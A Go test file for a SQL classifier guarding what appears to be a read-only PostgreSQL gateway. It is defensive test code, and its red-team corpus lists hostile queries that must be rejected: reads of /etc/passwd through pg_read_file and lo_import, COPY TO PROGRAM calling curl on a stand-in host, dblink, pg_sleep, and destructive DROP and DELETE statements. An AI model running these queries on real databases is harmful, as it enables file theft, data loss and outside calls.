package policy

import "testing"

// TestRedTeamCorpus is the spec's mandatory red-team corpus (design review,
// section "Red-team корпус"): every query here must be rejected, and with
// the specific error code the spec assigns it. Classify is the grammar
// layer; production also relies on PostgreSQL's own READ ONLY transaction
// enforcement (pgexec), which holds independently of the connecting role's
// grants -- see pgexec's package doc for that second, independent layer.
func TestRedTeamCorpus(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		want Code
	}{
		{"writable CTE delete", `WITH x AS (DELETE FROM payments RETURNING *) SELECT * FROM x`, CodeNotReadOnly},
		{"writable CTE update", `WITH x AS (UPDATE users SET is_admin=true RETURNING 1) SELECT * FROM x`, CodeNotReadOnly},
		{"writable CTE insert", `WITH x AS (INSERT INTO audit VALUES (1) RETURNING 1) SELECT * FROM x`, CodeNotReadOnly},
		{"nested writable CTE", `WITH a AS (WITH b AS (DELETE FROM t RETURNING 1) SELECT * FROM b) SELECT * FROM a`, CodeNotReadOnly},
		// Not valid Postgres grammar in the first place (only SELECT/VALUES
		// are legal inside a FROM-clause subquery), so the parser itself
		// rejects it -- still a hard reject, just at the parse layer rather
		// than the classification layer. The equivalent live attack surface
		// (writable statement reachable via a CTE, which IS valid grammar)
		// is covered by "writable CTE delete/update/insert/nested" above.
		{"writable subquery in FROM (invalid grammar, still rejected)", `SELECT * FROM (DELETE FROM payments RETURNING *) x`, CodeParseError},
		{"select into", `SELECT * INTO tmp FROM users`, CodeNotReadOnly},
		{"for update", `SELECT * FROM payments FOR UPDATE`, CodeForbiddenConstruct},
		{"for share", `SELECT * FROM payments FOR SHARE`, CodeForbiddenConstruct},
		{"multi stmt semicolon in literal", `SELECT 'a;b'; DELETE FROM payments`, CodeMultiStatement},
		{"multi stmt plain", `SELECT 1; DROP TABLE users`, CodeMultiStatement},
		{"explain analyze options", `EXPLAIN (ANALYZE, BUFFERS) SELECT 1`, CodeForbiddenConstruct},
		{"explain analyze bare", `EXPLAIN ANALYZE SELECT 1`, CodeForbiddenConstruct},
		{"explain wraps insert", `EXPLAIN INSERT INTO payments DEFAULT VALUES`, CodeNotReadOnly},
		{"pg_sleep", `SELECT pg_sleep(100000)`, CodeForbiddenFunction},
		{"pg_sleep qualified", `SELECT pg_catalog.pg_sleep(100000)`, CodeForbiddenFunction},
		{"pg_sleep nested in where", `SELECT id FROM t WHERE (SELECT pg_sleep(10)) IS NULL`, CodeForbiddenFunction},
		{"pg_read_file", `SELECT pg_read_file('/etc/passwd')`, CodeForbiddenFunction},
		{"dblink", `SELECT * FROM dblink('host=evil.internal', 'select 1') AS t(a int)`, CodeForbiddenFunction},
		{"lo_import", `SELECT lo_import('/etc/passwd')`, CodeForbiddenFunction},
		{"set_config", `SELECT set_config('statement_timeout','0',false)`, CodeForbiddenFunction},
		{"advisory lock", `SELECT pg_advisory_lock(1)`, CodeForbiddenFunction},
		{"query_to_xml", `SELECT query_to_xml('DELETE FROM t', true, true, '')`, CodeForbiddenFunction},
		{"copy to program", `COPY (SELECT 1) TO PROGRAM 'curl evil.internal'`, CodeNotReadOnly},
		{"drop table", `DROP TABLE users`, CodeNotReadOnly},
		{"delete", `DELETE FROM payments`, CodeNotReadOnly},
		{"set statement", `SET statement_timeout = 0`, CodeForbiddenConstruct},
		{"begin", `BEGIN`, CodeForbiddenConstruct},
		{"do block", `DO $$ BEGIN PERFORM pg_sleep(1); END $$`, CodeNotReadOnly},
		{"call proc", `CALL some_proc()`, CodeNotReadOnly},
		{"grant", `GRANT ALL ON users TO PUBLIC`, CodeNotReadOnly},
		{"truncate", `TRUNCATE payments`, CodeNotReadOnly},
		{"garbage", `NOT SQL AT ALL`, CodeParseError},
		{"empty", ``, CodeParseError},
		{"listen", `LISTEN foo`, CodeForbiddenConstruct},
		{"vacuum", `VACUUM ANALYZE payments`, CodeNotReadOnly},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Classify(tc.sql)
			if err == nil {
				t.Fatalf("expected %s, got allow", tc.want)
			}
			pe, ok := err.(*Error)
			if !ok {
				t.Fatalf("expected *Error, got %T: %v", err, err)
			}
			if pe.Code != tc.want {
				t.Fatalf("expected %s, got %s (%s)", tc.want, pe.Code, pe.Message)
			}
		})
	}
}

// TestLegitimateQueriesPass guards against the classifier being so
// conservative it breaks the exact read patterns section 20 of the spec
// (the "why did the subscription fail yesterday" scenario) needs to work.
func TestLegitimateQueriesPass(t *testing.T) {
	cases := []string{
		`SELECT id, status FROM payments ORDER BY created_at DESC LIMIT 20`,
		`WITH recent AS (SELECT * FROM payments WHERE created_at > now() - interval '1 day')
		 SELECT status, count(*) FROM recent GROUP BY status`,
		`SELECT u.id, p.amount FROM users u JOIN payments p ON p.user_id = u.id WHERE u.id = $1`,
		`SELECT * FROM generate_series(1, 10)`,
		`SELECT status, count(*) OVER (PARTITION BY status) FROM payments`,
		`SELECT (SELECT count(*) FROM payments WHERE user_id = u.id) FROM users u`,
		`SELECT a FROM t1 UNION ALL SELECT b FROM t2`,
		`EXPLAIN SELECT * FROM payments WHERE id = $1`,
		`EXPLAIN (VERBOSE, FORMAT JSON) SELECT 1`,
		`SELECT CASE WHEN status='FAILED' THEN 1 ELSE 0 END FROM payments`,
		`SELECT jsonb_agg(x) FROM (SELECT id FROM payments LIMIT 5) x`,
		`SELECT lower(email) FROM users`,
		`SELECT coalesce(a, b, c) FROM t`,
	}
	for _, sql := range cases {
		if _, err := Classify(sql); err != nil {
			t.Errorf("false reject %q: %v", sql, err)
		}
	}
}

func TestRelationExtraction(t *testing.T) {
	r, err := Classify(`SELECT * FROM billing.payments p JOIN public.users u ON u.id = p.user_id`)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Relations) != 2 {
		t.Fatalf("expected 2 relations, got %v", r.Relations)
	}
}

func TestExecutedSQLIsDeparsedNotOriginal(t *testing.T) {
	// The whole point of Deparse-before-execute: whatever survived
	// classification is what runs, so a comment in the original text cannot
	// carry anything past the checks -- it simply doesn't appear in SQL.
	r, err := Classify("SELECT id /* sneaky comment */ FROM payments -- trailing\n")
	if err != nil {
		t.Fatal(err)
	}
	if containsSubstr(r.SQL, "sneaky") || containsSubstr(r.SQL, "trailing") {
		t.Fatalf("deparsed SQL leaked original comment text: %q", r.SQL)
	}
}

func containsSubstr(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// knownUnreviewedStmtNodes is a frozen SNAPSHOT of every administrative /
// DDL / replication *Stmt node that existed in pg_query_go v5.1.0
// (libpg_query / PostgreSQL 17 grammar) at the time this policy was written.
// None of them are write-capable in the INSERT/UPDATE/DELETE sense that
// matters for a read gateway, and none of them can appear inside a SELECT's
// own tree (they are never reachable as a sub-node of a permitted
// SelectStmt/ExplainStmt -- only as their OWN top-level statement, which the
// classify.go switch's `default:` branch already rejects with
// CodeNotReadOnly before the walk ever needs to name them individually).
// They are captured here, rather than added one-by-one to deniedNodes,
// because enumerating seventy near-identical DDL statement types by hand
// invites transcription mistakes that a flat "reject anything not
// SELECT/EXPLAIN at the top level" rule does not.
//
// The guarantee this test provides is about node types NOT in this
// snapshot: TestNoUnclassifiedStatementNodes fails the moment `go get -u`
// on pg_query_go introduces a *Stmt type that is in NONE of allowedNodes,
// deniedNodes, or this snapshot -- forcing a human to look at it and add it
// to the right list before the upgrade can ship, rather than silently
// inheriting whatever default the walk happens to apply.
var knownUnreviewedStmtNodes = map[string]bool{
	"SetOperationStmt": true, "ReturnStmt": true, "PLAssignStmt": true,
	"CreateSchemaStmt": true, "ReplicaIdentityStmt": true, "AlterCollationStmt": true,
	"AlterDomainStmt": true, "AlterDefaultPrivilegesStmt": true, "VariableShowStmt": true,
	"CreateTableSpaceStmt": true, "DropTableSpaceStmt": true, "AlterTableSpaceOptionsStmt": true,
	"AlterTableMoveAllStmt": true, "AlterExtensionStmt": true, "AlterExtensionContentsStmt": true,
	"CreateFdwStmt": true, "AlterFdwStmt": true, "CreateForeignServerStmt": true,
	"AlterForeignServerStmt": true, "CreateForeignTableStmt": true, "CreateUserMappingStmt": true,
	"AlterUserMappingStmt": true, "DropUserMappingStmt": true, "ImportForeignSchemaStmt": true,
	"CreatePolicyStmt": true, "AlterPolicyStmt": true, "CreateAmStmt": true,
	"CreateTrigStmt": true, "CreateEventTrigStmt": true, "AlterEventTrigStmt": true,
	"CreatePLangStmt": true, "AlterRoleSetStmt": true, "DropRoleStmt": true,
	"CreateSeqStmt": true, "AlterSeqStmt": true, "DefineStmt": true,
	"CreateDomainStmt": true, "CreateOpClassStmt": true, "CreateOpFamilyStmt": true,
	"AlterOpFamilyStmt": true, "CommentStmt": true, "SecLabelStmt": true,
	"CreateStatsStmt": true, "AlterStatsStmt": true, "AlterFunctionStmt": true,
	"RenameStmt": true, "AlterObjectDependsStmt": true, "AlterObjectSchemaStmt": true,
	"AlterOwnerStmt": true, "AlterOperatorStmt": true, "AlterTypeStmt": true,
	"RuleStmt": true, "CompositeTypeStmt": true, "CreateEnumStmt": true,
	"CreateRangeStmt": true, "AlterEnumStmt": true, "LoadStmt": true,
	"CreatedbStmt": true, "AlterDatabaseStmt": true, "AlterDatabaseRefreshCollStmt": true,
	"AlterDatabaseSetStmt": true, "DropdbStmt": true, "AlterSystemStmt": true,
	"ClusterStmt": true, "CheckPointStmt": true, "DiscardStmt": true,
	"ConstraintsSetStmt": true, "ReindexStmt": true, "CreateConversionStmt": true,
	"CreateCastStmt": true, "CreateTransformStmt": true, "DropOwnedStmt": true,
	"ReassignOwnedStmt": true, "AlterTSDictionaryStmt": true, "AlterTSConfigurationStmt": true,
	"CreatePublicationStmt": true, "AlterPublicationStmt": true, "CreateSubscriptionStmt": true,
	"AlterSubscriptionStmt": true, "DropSubscriptionStmt": true,
}

// TestNoUnclassifiedStatementNodes is the fail-closed CI guard against a
// parser upgrade (newer libpg_query tracking a newer Postgres grammar)
// silently introducing a new *Stmt node type that nodes.go has not been
// reviewed against. A statement-shaped node that is neither on the
// allow-list, deny-list, nor the reviewed knownUnreviewedStmtNodes snapshot
// fails this test BEFORE it can ship, forcing an explicit decision instead
// of an implicit pass-through.
func TestNoUnclassifiedStatementNodes(t *testing.T) {
	for _, name := range allStmtMessageNames() {
		if allowedNodes[name] {
			if name != "SelectStmt" && name != "ExplainStmt" && name != "RawStmt" {
				t.Errorf("statement node %q is on the ALLOW list but is a *Stmt node — "+
					"review whether a write-capable statement type was accidentally allow-listed", name)
			}
			continue
		}
		if _, ok := deniedNodes[name]; ok {
			continue
		}
		if knownUnreviewedStmtNodes[name] {
			continue
		}
		t.Errorf("statement node %q is a NEW *Stmt type not present in the reviewed snapshot "+
			"(allowedNodes/deniedNodes/knownUnreviewedStmtNodes) — a pg_query_go upgrade introduced "+
			"this construct; add it to nodes.go's deniedNodes (or, if it is genuinely read-only and "+
			"needed, to allowedNodes with a review comment) before shipping this parser version", name)
	}
}
